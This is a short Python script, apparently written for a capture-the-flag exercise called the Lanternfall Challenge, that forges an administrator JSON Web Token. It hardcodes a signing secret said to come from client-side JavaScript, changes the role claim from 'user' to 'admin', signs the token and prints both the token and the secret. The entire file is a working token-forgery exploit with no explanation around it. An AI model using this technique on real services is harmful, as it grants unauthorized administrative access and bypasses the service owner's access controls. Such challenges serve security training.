#!/usr/bin/env python3
"""
Forge Admin JWT Token for Lanternfall Challenge
Author: Claude
Purpose: Create admin JWT to access privileged endpoints
Created: 2025-11-20
Expected: Admin access to /api/admin endpoints
"""

import jwt
import datetime

# JWT secret found in client-side JavaScript
JWT_SECRET = "ayame_moonlight_gekko_secret_key_for_jwt_signing_do_not_use_in_production_2024"

# Create admin token
payload = {
    "sub": "2",
    "username": "testuser",
    "role": "admin",  # Changed from "user" to "admin"
    "email": "test@test.com",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(hours=1)).timestamp()),
    "jti": "forged-admin-token-001"
}

# Sign the token
admin_token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")

print("Admin JWT Token:")
print(admin_token)
print("\nX-Lantern-Sigil Header Value:")
print(JWT_SECRET)
